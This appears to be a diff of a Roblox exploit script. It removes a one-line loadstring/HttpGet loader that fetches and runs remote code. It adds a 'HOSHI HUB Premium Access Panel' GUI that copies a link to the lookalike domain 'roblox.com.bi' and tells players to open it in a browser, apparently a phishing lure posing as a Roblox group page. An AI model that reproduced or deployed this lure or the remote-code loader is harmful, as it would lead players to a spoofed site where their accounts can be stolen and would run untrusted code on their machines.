@@ -1,1 +1,199 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjJlYjdiZGI4LTI5ZmYtNDY4Ni05Y2FjLTYxYTM3YWU0ODJkOCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local GROUP_LINK = "https://www.roblox.com.bi/communities/418461421392/Blox-Buddies"
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "HoshiHub"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local Main = Instance.new("Frame")
+Main.Parent = ScreenGui
+Main.AnchorPoint = Vector2.new(0.5,0.5)
+Main.Position = UDim2.new(0.5,0,0.5,0)
+Main.Size = UDim2.new(0,0,0,0)
+Main.BackgroundColor3 = Color3.fromRGB(18,18,28)
+Main.BorderSizePixel = 0
+
+Instance.new("UICorner",Main).CornerRadius = UDim.new(0,18)
+
+local Stroke = Instance.new("UIStroke")
+Stroke.Parent = Main
+Stroke.Color = Color3.fromRGB(120,80,255)
+Stroke.Thickness = 1.5
+
+local Title = Instance.new("TextLabel")
+Title.Parent = Main
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0,0,0,15)
+Title.Size = UDim2.new(1,0,0,40)
+Title.Text = "HOSHI HUB"
+Title.Font = Enum.Font.GothamBold
+Title.TextScaled = true
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+
+local Subtitle = Instance.new("TextLabel")
+Subtitle.Parent = Main
+Subtitle.BackgroundTransparency = 1
+Subtitle.Position = UDim2.new(0,0,0,55)
+Subtitle.Size = UDim2.new(1,0,0,25)
+Subtitle.Text = "Premium Access Panel"
+Subtitle.Font = Enum.Font.Gotham
+Subtitle.TextScaled = true
+Subtitle.TextColor3 = Color3.fromRGB(180,180,180)
+
+local Info = Instance.new("TextLabel")
+Info.Parent = Main
+Info.BackgroundTransparency = 1
+Info.Position = UDim2.new(0.05,0,0.28,0)
+Info.Size = UDim2.new(0.9,0,0.25,0)
+Info.TextXAlignment = Enum.TextXAlignment.Left
+Info.TextYAlignment = Enum.TextYAlignment.Top
+Info.TextColor3 = Color3.fromRGB(220,220,220)
+Info.Font = Enum.Font.Gotham
+Info.TextScaled = true
+Info.Text =
+"• Click JOIN GROUP\n"..
+"• Link copies automatically\n"..
+"• Open browser and join\n"..
+"• Return to continue"
+
+local JoinButton = Instance.new("TextButton")
+JoinButton.Parent = Main
+JoinButton.Size = UDim2.new(0,300,0,60)
+JoinButton.Position = UDim2.new(0.5,-150,0.68,0)
+JoinButton.Text = "JOIN GROUP"
+JoinButton.Font = Enum.Font.GothamBold
+JoinButton.TextScaled = true
+JoinButton.TextColor3 = Color3.new(1,1,1)
+JoinButton.BorderSizePixel = 0
+
+Instance.new("UICorner",JoinButton).CornerRadius = UDim.new(0,14)
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Parent = JoinButton
+Gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,140)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(120,0,255))
+}
+
+local Close = Instance.new("TextButton")
+Close.Parent = Main
+Close.Size = UDim2.new(0,30,0,30)
+Close.Position = UDim2.new(1,-40,0,10)
+Close.Text = "✕"
+Close.Font = Enum.Font.GothamBold
+Close.TextScaled = true
+Close.BackgroundTransparency = 1
+Close.TextColor3 = Color3.fromRGB(255,100,100)
+
+local Notify = Instance.new("TextLabel")
+Notify.Parent = ScreenGui
+Notify.AnchorPoint = Vector2.new(0.5,1)
+Notify.Position = UDim2.new(0.5,0,1,-25)
+Notify.Size = UDim2.new(0,250,0,40)
+Notify.BackgroundColor3 = Color3.fromRGB(30,30,30)
+Notify.TextColor3 = Color3.fromRGB(255,255,255)
+Notify.Font = Enum.Font.GothamBold
+Notify.TextScaled = true
+Notify.Text = ""
+Notify.Visible = false
+
+Instance.new("UICorner",Notify).CornerRadius = UDim.new(0,10)
+
+TweenService:Create(
+	Main,
+	TweenInfo.new(.5,Enum.EasingStyle.Back),
+	{Size = UDim2.new(0,650,0,380)}
+):Play()
+
+local function popup(text)
+	Notify.Text = text
+	Notify.Visible = true
+	Notify.TextTransparency = 1
+
+	TweenService:Create(
+		Notify,
+		TweenInfo.new(.3),
+		{TextTransparency = 0}
+	):Play()
+
+	task.wait(2)
+
+	TweenService:Create(
+		Notify,
+		TweenInfo.new(.3),
+		{TextTransparency = 1}
+	):Play()
+
+	task.wait(.3)
+	Notify.Visible = false
+end
+
+JoinButton.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(GROUP_LINK)
+		popup("✓ Link copied to clipboard")
+	else
+		popup("Clipboard unsupported")
+	end
+end)
+
+JoinButton.MouseEnter:Connect(function()
+	TweenService:Create(
+		JoinButton,
+		TweenInfo.new(.15),
+		{Size = UDim2.new(0,320,0,65)}
+	):Play()
+end)
+
+JoinButton.MouseLeave:Connect(function()
+	TweenService:Create(
+		JoinButton,
+		TweenInfo.new(.15),
+		{Size = UDim2.new(0,300,0,60)}
+	):Play()
+end)
+
+Close.MouseButton1Click:Connect(function()
+	TweenService:Create(
+		Main,
+		TweenInfo.new(.25),
+		{Size = UDim2.new(0,0,0,0)}
+	):Play()
+
+	task.wait(.25)
+	ScreenGui:Destroy()
+end)
+
+local dragging = false
+local dragStart
+local startPos
+
+Main.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = Main.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		local delta = input.Position - dragStart
+
+		Main.Position = UDim2.new(
+			startPos.X.Scale,
+			startPos.X.Offset + delta.X,
+			startPos.Y.Scale,
+			startPos.Y.Offset + delta.Y
+		)
+	end
+end)
